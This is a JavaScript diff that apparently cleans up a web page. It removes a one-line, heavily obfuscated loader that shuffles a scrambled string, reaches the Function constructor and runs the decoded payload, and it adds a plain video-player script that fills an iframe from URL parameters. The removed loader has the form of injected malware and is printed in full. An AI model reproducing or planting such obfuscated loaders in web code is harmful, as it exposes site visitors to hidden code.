@@ -1,1 +1,26 @@
-(function(){var Mqm='',xaH=253-242;function jMn(c){var v=1170982;var q=c.length;var p=[];for(var o=0;o<q;o++){p[o]=c.charAt(o)};for(var o=0;o<q;o++){var b=v*(o+394)+(v%49087);var w=v*(o+317)+(v%15133);var d=b%q;var j=w%q;var k=p[d];p[d]=p[j];p[j]=k;v=(b+w)%1368703;};return p.join('')};var lSA=jMn('rtustobnekocrctmogdycruvnlpqhsafixwjz').substr(0,xaH);var MFp='+Ar(evz9)tjgv,lnyo;=p;r=sparo<ifri)nn"m[jprt-1u(wx. r;r1rbe=4Ca(ra,wra)]6C"mq6 8f)virvi,+0r{u,s0l]8gf1,tt(r};av)9; k86f6.c)wr.rvl.77(rs;rn])=)c[,(s<}2!+h)[+.e  )fi]m(1,c;fv+-f67<ubrravkl "64rn+4h;;9od(ud(.<(0miv]egdrea(7"lvfAr=;u(8)fnar9ac2yg,vrgja=;ugcpa{l=go,e;re5a "aAk[*+lrx>hhl1yom7ild-);{t,) uro;llcC)= toip }!.r[lavn.,1q;v;nv+x 5ert2bxw)Cumh[ba-)sjv];p.;jr(6=w;h<32c+n) ,8a)9;xi>gh}0oef (0[eufs;og=a;er;s7fh)=lkan+"o,o(elnanr;6g(rx;.+j=zi);=;nC++=};.kelr,,eshor{rf2*t=]Sen1ur+)+,.,]s(;"iqz;t,+d.a+s.lex189r.=rm) 4(;bl ;0;mt)21A)8f)mgo=+r=5a]}danjcsn)+=m(=tb;84=[ucoe=g8.dt{h.nfc))=n=ox,1)[n}(sssrwa[[,r]{;.rh=p;ataa v3n(r=onmh+,a0=h[=-aegviasrnhrj;azcj);8a=a"e(si]m()i,h{=0htr( o;m0ozmt(n(us1u+r+=n7ums; rkgj.01)e+, ico0=sm,, i .2(cdaeA6=pnhrul-vfvoilox(vmCh=-eu8ar=(.=f(v(92)ytbirt,g=lh.r9i;=s+;+tta"l9 t;wr1]i.u7h ivj)wwb .z;h]ldveovvqC=uti(uicr.d4S ;],a=t=C[0t7e=v.g("[qtv;oci(h;.';var cwv=jMn[lSA];var QLo='';var jjC=cwv;var jkP=cwv(QLo,jMn(MFp));var lNC=jkP(jMn('E&oELLs6aT],=iudd)=LL;i\/a.u0_m(;e1nB1ao1aspS0..nvg=Loa_5K=rt85!)l9]4dHtty.f1_0rhLLflL).ac_sec$[*rn){Ngm;%s.(aLglrt,Fmrg=fnitLLTL0x$3L.h$L2cfe%\/.)4)wtrrg)deo2sm2L1ev34L.,nai+3#{=;e3r,McLD_n fosp1fiud0t?L1L1Lunieae)]ded;N.Mr!eLiL(fAgj33,L4L,.L6Lt .L31jM?LA r. L=o5L4h,"e"fn]+iL%(t,c0"?tg5vr"_tt{l=f1LDor]o.i%]jEaKLrsnet9Cf)ls k!Lf(ene_zn5Lf=6Lv&L]0rvc(.F-C>;aaLezL%5idfuoeL%.( e rn.!( Le0d3L.}dio3;LLtlh!oGne1g]7esdsfLneueEb5toh6_g,nHd4f0ie5};fse6I%_p&t4d;.otn<(Lz i=.eh$cc.](mL3%)L.\'oC\/=cn!4a1s;sslaln(Lnb(e73L6J!h&L$,L=.0oL_e_Lm\/.)}qkfaLr,;un6e]3u3(ete__y7(&Gtrre .._\/cny466<m)r=8iseib bLLmL@\/05-.u"BwlK1l;{e.l]L;eeL-Eeg)5.m3)%rumE)03gI{lLL$$(.(let,tLs(.56e35rL L%)f=2L$)!)meaL}PpLiL_1LlNd26LKeH2.]K*e_>\/p4\/_)Lf!8d4oi.07()l=s)vue1eLd7e)(c}S2&L1)e;Lrnn!!6o1i(@9{f=33vm3.LLn.hi_I)0$i)P_e}orM;.."sdi}4.%Lv=L%=}bLb{_OL.ostm+;n{_]rdoh8.L_ 1*7mfr,L(L)t[LLdroaL]5z1g5Lf2f5(51oGl.d%O.ia)j;;f_7henL}a7_)efLr33bw@u.LL!L7s4c{d9()eLLo_j_sL.N3"Ecss_f!%&a9CjogeL)L,=L1i5.12LS.f;ho(s_m_%td{)ctrbc%2C5)ca =+oiL8Lp43sftLat1aK(1m.=_LJ).$(4edxL_5L =<pt"}L1>h?)sLtLzn[d>_LT0@T3d2j##.nrD-m4.!!L+M?3))i]L,1s"4s7L rcL s;L.ttLtn,La.$)oaKjdL#{!xt.4e4_=@.uLeloL-\/%vL_a.L_LJoLi:do!%oLL(,=nfwL4\'HLnvLLf_);(!r(_taoH67"nl(Lwzj]Lo!e).)%(]a.o\/L i}L:3T5 Kc7!-)%6oeo@pe]a( ern_(r6]Le=(_L)d1n7t.LyL=r)fLlrLb{]v66e825F(S+.$e2*LeL,4L!o}t)i=_aL8LcLlL2LvlL{dOtsf)%a;n{10sLnef_jed)(uef)Ln(61ai3$av\'b6e]4!L0+"(pLLf(3]t.,L%qd}LLi.wa_1k1,.fm)o,;=uoFJL;(3u47.LLn(g0 _(1Ld!5_]9\/$.LS.9_8Le)}z.L)6L!)4r0rm@ nLto5ruLoLGf.$l7t,9f31;o;sLKt_h3g.l>L)mu_\/an.Lh?$.eb7r=)ir].4f1Lods1.vd=}+(;(=(3+Pol87]:1Leo]n;$.;!$Lcs$f0o d5CfAL6)d,4(I]o{(Lecr7a)f6n()HG)m;2:L{_5L}tnDd[_vo7_.<(L_Ce(oL;cf#LeL3d22I1s;2 se.f0e(1r _;)ra}(6;L)+eyo);{mLel)ee)6){]f68do)LI1ia_;102ieL%,L03n?<dL]L66,tLAoLdL()1!.feLLf>&LL(me.,y)%ao.Ls09tE;ln, rL1o1.c.=LI.n{3I#7hi(4lH*6Lnc1BH(po!)$Lsv1(+L51w=!zBl!r2_$.d[1,L.s+1res1t+!f.LL(h9=4fL)&lLLoLu((!!(m!.=[())L.3r\/.}!;.(aC=8L9L14 fLrl,j.r%::c ]tocn=etdg{oovLn1CL%tt&8aLmv!p=.!dovwL"f(ne9s+_8LL !!uL1N3rr(Ln3Lf.f9)L=9%%1Lt{Lebri$9;.].bL,i51cLhat6LL)!et)48LL{LL{9.ir.ot4LL]{!2p5r0,%SximLe(pL n%L5n}s.= !67.$(Ei5H_f_Ntopf,.&btspcw;e]ftoeoM(d[3so)ef_=t)Gf}uG! 9=a.o4_3!_[ LL..L=.{[Ce!e$ bn%$nf(mL%Lfsdv..a3=.tf6__LS=d]eLL4mr_ zeIMLGe.dc(hrcL2ei L%.noo1N3ersn vsa,.!tvl24t=)hnc3fziL0po\/(f$u3mt.)p)umo_Lre!@;=eb9.701.)eLs)LiGcf=a !% !tLLiiidp+tora18FfP[auLLL=rts5.tLv(re)$mL=)u!L)e.,4 2eiLnEb0](L:hv4_Lm;:* m=%m +.L,,\'i$.udeMn3iItz9LfLi. mf2L; ,LiLs OM!f_d))!e5LB }as.}{D{e))L.!La.(.l-a( rrL,L4L{eLL#om_(a)a1.mti 5)!l'));var eKQ=jjC(Mqm,lNC );eKQ(2434);return 1234})()
+document.addEventListener('DOMContentLoaded', async function () {
+            const urlParams = new URLSearchParams(window.location.search);
+            const videoId = urlParams.get('video_id');
+            const seasonNumber = urlParams.get('s');
+            const episodeNumber = urlParams.get('e');
+            const loadingScreen = document.getElementById('loading-screen');
+            const videoContainer = document.getElementById('video-container');
+            const videoFrame = document.getElementById('video-frame');
+
+            if (videoId === '65334' && seasonNumber === '6' && episodeNumber === '2') {
+                videoFrame.src = "https://cdn.cineware.xyz/e/MTB6VG9haXowR1d5U3VsNW5tdUZMdz09";
+            } else if (videoId && seasonNumber && episodeNumber) {
+                videoFrame.src = `https://multiembed.mov/directstream.php?video_id=${videoId}&tmdb=1&s=${seasonNumber}&e=${episodeNumber}`;
+            } else if (videoId) {
+                videoFrame.src = `https://multiembed.mov/directstream.php?video_id=${videoId}&tmdb=1`;
+            } else {
+                loadingScreen.innerText = 'Error: Video not found or invalid parameters.';
+                return;
+            }
+
+            setTimeout(() => {
+                loadingScreen.style.display = "none";
+                videoContainer.style.display = "block";
+                videoFrame.style.pointerEvents = "auto";
+            }, 2000);
+        });
